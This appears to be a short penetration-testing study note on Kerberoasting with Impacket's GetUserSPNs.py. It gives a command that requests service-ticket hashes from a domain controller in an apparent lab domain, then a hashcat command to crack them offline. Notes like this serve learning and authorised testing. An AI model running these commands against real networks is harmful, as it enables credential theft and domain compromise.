<- [[Kerberos]]

# GetUserSPNs.py - Impacket
Part of #Impacket.

> This module will try to find Service Principal Names that are associated with normal user account. Since normal account's password tend to be shorter than machine accounts, and knowing that a TGS request will encrypt the ticket with the account the SPN is running under, this could be used for an offline bruteforcing attack of the SPNs account NTLM hash if we can gather valid TGS for those SPNs.

\- [GetUserSPNs.py Github](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)

![[GetUsersSPNs-usage.png]]

## Example Usage
`sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.173.126 -request`
- `controller.local` - domain name
- `Machine1:Password1` - user acct and password
- `-dc-ip` - IP of DC
- `-request` 

The returned hash can be cracked with hashcat:
`hashcat -m 13100 -a 0 <in-hash>.txt <wordlist>.txt`

